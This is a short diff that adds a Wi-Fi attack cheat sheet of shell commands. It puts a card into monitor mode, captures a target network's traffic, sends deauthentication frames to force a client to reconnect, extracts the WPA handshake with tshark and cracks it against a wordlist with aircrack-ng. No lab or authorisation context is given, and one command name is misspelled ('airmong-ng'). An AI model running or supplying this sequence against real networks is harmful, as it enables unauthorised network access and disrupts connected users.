@@ -1,3 +1,14 @@
+$ ifconfig
+iwconfig
+airmong-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c <CHANNEL> -w <CAPTURE_FILE> --essid <ESSID> --bssid <BSSID> wlan0mon
+aireplay-ng -0 1 -a <BSSID> -c <CLIENT MAC> wlan0mon
+tshark -r <CAPTURE_FILE> -n -Y eapol
+aircrack-ng -w <WORDLIST> -e <ESSID> -b <BSSID>
+
+
+
 sudo airmon-ng check kill
 
 sudo airmon-ng start wlan0
